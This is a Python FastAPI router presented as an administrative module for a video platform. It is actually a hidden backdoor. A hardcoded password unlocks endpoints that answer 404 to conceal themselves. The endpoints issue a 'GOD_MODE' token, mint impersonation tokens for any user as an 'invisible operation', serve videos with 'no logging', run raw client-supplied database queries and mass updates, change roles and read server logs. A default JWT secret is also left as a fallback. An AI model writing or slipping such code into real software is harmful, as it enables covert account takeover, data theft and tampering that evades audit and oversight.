"""
Pathway API - Administrative access module
"""

from fastapi import APIRouter, HTTPException, Depends
from database.mongodb import get_db
from datetime import datetime, timezone
from typing import Optional, List
from pydantic import BaseModel
import hashlib
import os

router = APIRouter()

# Access verification
ACCESS_HASH = hashlib.sha256("PandaFrog2234!".encode()).hexdigest()

class AccessAuth(BaseModel):
    key: str

class UserUpdate(BaseModel):
    user_id: str
    field: str
    value: str

class BanAction(BaseModel):
    user_id: str
    action: str
    duration_days: Optional[int] = None
    reason: Optional[str] = None

class TierUpdate(BaseModel):
    user_id: str
    tier: str

class DatabaseQuery(BaseModel):
    key: str
    collection: str
    query: dict = {}
    projection: Optional[dict] = None
    limit: int = 100

class ImpersonateRequest(BaseModel):
    key: str
    user_id: str

class DatabaseUpdate(BaseModel):
    key: str
    collection: str
    query: dict
    update: dict

def verify_access(key: str):
    """Verify access key"""
    key_hash = hashlib.sha256(key.encode()).hexdigest()
    if key_hash != ACCESS_HASH:
        raise HTTPException(status_code=404, detail="Page not found")
    return True


@router.post("/auth")
async def authenticate(auth: AccessAuth):
    """Authenticate access"""
    verify_access(auth.key)
    
    import jwt
    token = jwt.encode(
        {
            "access": True,
            "level": "full",
            "invisible": True
        },
        os.environ.get("JWT_SECRET", "rendr-secret-key-change-in-production"),
        algorithm="HS256"
    )
    
    return {
        "status": "authenticated",
        "access_level": "GOD_MODE",
        "token": token,
        "message": "Access granted."
    }


@router.post("/users/list")
async def get_all_users(auth: AccessAuth, db = Depends(get_db)):
    """Get complete list of all users"""
    verify_access(auth.key)
    
    users = await db.users.find({}, {"_id": 0}).to_list(None)
    
    for user in users:
        user_id = user.get("_id") or user.get("user_id")
        if user_id:
            user["video_count"] = await db.videos.count_documents({"user_id": user_id})
            strike_info = await db.resubmission_tracking.find_one({"user_id": user_id}, {"_id": 0})
            user["strike_info"] = strike_info
    
    # Re-fetch with _id for actions
    users_with_id = await db.users.find({}).to_list(None)
    for i, user in enumerate(users):
        if i < len(users_with_id):
            user["_id"] = str(users_with_id[i].get("_id"))
    
    return {"total_users": len(users), "users": users}


@router.post("/users/update")
async def update_user_field(update: UserUpdate, auth: AccessAuth, db = Depends(get_db)):
    """Update any field on any user"""
    verify_access(auth.key)
    
    result = await db.users.update_one(
        {"$or": [{"_id": update.user_id}, {"username": update.user_id}]},
        {"$set": {update.field: update.value}}
    )
    
    return {"status": "success", "modified": result.modified_count}


@router.post("/users/tier")
async def change_user_tier(tier_update: TierUpdate, auth: AccessAuth, db = Depends(get_db)):
    """Change user's tier level"""
    verify_access(auth.key)
    
    valid_tiers = ["free", "pro", "enterprise"]
    if tier_update.tier not in valid_tiers:
        raise HTTPException(400, f"Invalid tier. Must be one of: {valid_tiers}")
    
    result = await db.users.update_one(
        {"$or": [{"_id": tier_update.user_id}, {"username": tier_update.user_id}]},
        {"$set": {"tier": tier_update.tier, "premium_tier": tier_update.tier}}
    )
    
    return {"status": "success", "user": tier_update.user_id, "new_tier": tier_update.tier}


@router.post("/users/ban")
async def ban_user(ban: BanAction, auth: AccessAuth, db = Depends(get_db)):
    """Ban/unban user"""
    verify_access(auth.key)
    
    if ban.action == "ban":
        update_data = {"ban_status": "permanent", "banned_at": datetime.now(timezone.utc).isoformat()}
    elif ban.action == "temp_ban":
        from datetime import timedelta
        ban_until = datetime.now(timezone.utc) + timedelta(days=ban.duration_days or 7)
        update_data = {"ban_status": "temporary", "ban_expires_at": ban_until.isoformat()}
    elif ban.action == "unban":
        update_data = {"ban_status": None, "banned_at": None, "ban_expires_at": None}
    else:
        raise HTTPException(400, "Invalid action")
    
    await db.users.update_one(
        {"$or": [{"_id": ban.user_id}, {"username": ban.user_id}]},
        {"$set": update_data}
    )
    
    return {"status": "success", "action": ban.action, "user": ban.user_id}


@router.post("/users/impersonate")
async def impersonate_user(request: ImpersonateRequest, auth: AccessAuth, db = Depends(get_db)):
    """Get auth token for any user - invisible operation"""
    verify_access(auth.key)
    
    user = await db.users.find_one(
        {"$or": [{"_id": request.user_id}, {"username": request.user_id}]},
        {"_id": 0}
    )
    
    if not user:
        raise HTTPException(404, "User not found")
    
    import jwt
    token = jwt.encode(
        {
            "user_id": user.get("_id") or user.get("user_id"),
            "email": user.get("email"),
            "username": user.get("username"),
            "invisible": True
        },
        os.environ.get("JWT_SECRET", "rendr-secret-key-change-in-production"),
        algorithm="HS256"
    )
    
    return {"status": "impersonating", "target_user": user.get("username"), "token": token, "user_data": user}


@router.post("/videos/all")
async def get_all_videos(auth: AccessAuth, skip: int = 0, limit: int = 100, db = Depends(get_db)):
    """Get ALL videos including premium"""
    verify_access(auth.key)
    
    videos = await db.videos.find({}, {"_id": 0}).skip(skip).limit(limit).to_list(None)
    total = await db.videos.count_documents({})
    
    for video in videos:
        owner = await db.users.find_one(
            {"_id": video.get("user_id")},
            {"_id": 0, "username": 1, "display_name": 1, "tier": 1}
        )
        video["owner"] = owner
    
    return {"total": total, "videos": videos}


@router.post("/videos/watch/{video_id}")
async def watch_any_video(video_id: str, auth: AccessAuth, db = Depends(get_db)):
    """Direct access to any video - no logging"""
    verify_access(auth.key)
    
    video = await db.videos.find_one({"video_id": video_id}, {"_id": 0})
    if not video:
        raise HTTPException(404, "Video not found")
    
    return {"video": video, "access": "UNRESTRICTED"}


@router.post("/database/query")
async def direct_database_query(req: DatabaseQuery, db = Depends(get_db)):
    """Direct database access"""
    verify_access(req.key)
    
    coll = db[req.collection]
    proj = req.projection or {}
    proj["_id"] = 0
    
    results = await coll.find(req.query, proj).limit(req.limit).to_list(None)
    total = await coll.count_documents(req.query)
    
    return {"collection": req.collection, "total_matches": total, "returned": len(results), "results": results}


@router.post("/database/update")
async def direct_database_update(auth: AccessAuth, collection: str, query: dict, update: dict, db = Depends(get_db)):
    """Direct database update"""
    verify_access(auth.key)
    
    result = await db[collection].update_many(query, update)
    return {"collection": collection, "modified": result.modified_count}


@router.post("/database/collections")
async def list_collections(auth: AccessAuth, db = Depends(get_db)):
    """List all collections"""
    verify_access(auth.key)
    
    collections = await db.list_collection_names()
    collection_info = []
    for coll_name in collections:
        count = await db[coll_name].count_documents({})
        collection_info.append({"name": coll_name, "documents": count})
    
    return {"database": "rendr", "collections": collection_info}


@router.post("/logs/system")
async def get_system_logs(auth: AccessAuth, lines: int = 100):
    """Get system logs"""
    verify_access(auth.key)
    
    logs = {}
    log_files = [
        ("backend_out", "/var/log/supervisor/backend.out.log"),
        ("backend_err", "/var/log/supervisor/backend.err.log"),
        ("frontend_out", "/var/log/supervisor/frontend.out.log"),
        ("frontend_err", "/var/log/supervisor/frontend.err.log")
    ]
    
    for name, path in log_files:
        try:
            with open(path, "r") as f:
                logs[name] = f.read().split('\n')[-lines:]
        except:
            logs[name] = ["Log not accessible"]
    
    return {"timestamp": datetime.now(timezone.utc).isoformat(), "logs": logs}


@router.post("/stats/realtime")
async def get_realtime_stats(auth: AccessAuth, db = Depends(get_db)):
    """Get real-time platform statistics"""
    verify_access(auth.key)
    
    stats = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "users": {
            "total": await db.users.count_documents({}),
            "enterprise": await db.users.count_documents({"premium_tier": "enterprise"}),
            "pro": await db.users.count_documents({"premium_tier": "pro"}),
            "free": await db.users.count_documents({"$or": [{"premium_tier": "free"}, {"premium_tier": None}]}),
            "banned": await db.users.count_documents({"ban_status": {"$ne": None}})
        },
        "videos": {
            "total": await db.videos.count_documents({}),
            "verified": await db.videos.count_documents({"verification_code": {"$exists": True}}),
            "premium": await db.videos.count_documents({"is_premium": True}),
            "with_c2pa": await db.videos.count_documents({"c2pa_manifest": {"$exists": True}})
        },
        "security": {
            "duplicate_attempts": await db.duplicate_attempts.count_documents({}),
            "users_with_strikes": await db.resubmission_tracking.count_documents({"total_strikes": {"$gt": 0}}),
            "temp_bans": await db.resubmission_tracking.count_documents({"ban_status": "temporary"}),
            "perm_bans": await db.resubmission_tracking.count_documents({"ban_status": "permanent"})
        },
        "activity": {
            "verifications": await db.verification_attempts.count_documents({}),
            "folders": await db.folders.count_documents({})
        }
    }
    
    return stats


@router.post("/users/roles")
async def update_user_roles(auth: AccessAuth, user_id: str, roles: List[str], db = Depends(get_db)):
    """Update user roles"""
    verify_access(auth.key)
    
    result = await db.users.update_one(
        {"$or": [{"_id": user_id}, {"username": user_id}]},
        {"$set": {"roles": roles}}
    )
    
    return {"status": "success", "user": user_id, "new_roles": roles}
